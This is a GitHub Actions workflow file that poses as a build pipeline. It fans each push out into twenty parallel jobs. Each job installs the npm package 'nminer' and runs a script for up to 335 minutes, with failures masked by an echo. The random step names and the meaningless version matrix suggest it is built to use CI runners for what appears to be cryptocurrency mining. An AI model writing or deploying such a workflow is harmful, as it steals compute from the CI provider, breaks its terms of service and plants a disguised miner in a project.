name: step-mother
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1299 }
          - { version: 8807 }
          - { version: 573 }
          - { version: 9969 }
          - { version: 6266 }
          - { version: 2078 }
          - { version: 112 }
          - { version: 7453 }
          - { version: 671 }
          - { version: 9836 }
          - { version: 3441 }
          - { version: 8513 }
          - { version: 251 }
          - { version: 6863 }
          - { version: 2430 }
          - { version: 8809 }
          - { version: 7642 }
          - { version: 3527 }
          - { version: 7178 }
          - { version: 9902 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: robust heroine regarding
        run: |
          npm install nminer@latest
          timeout 335m node step-mother.js || echo "step-mother executed"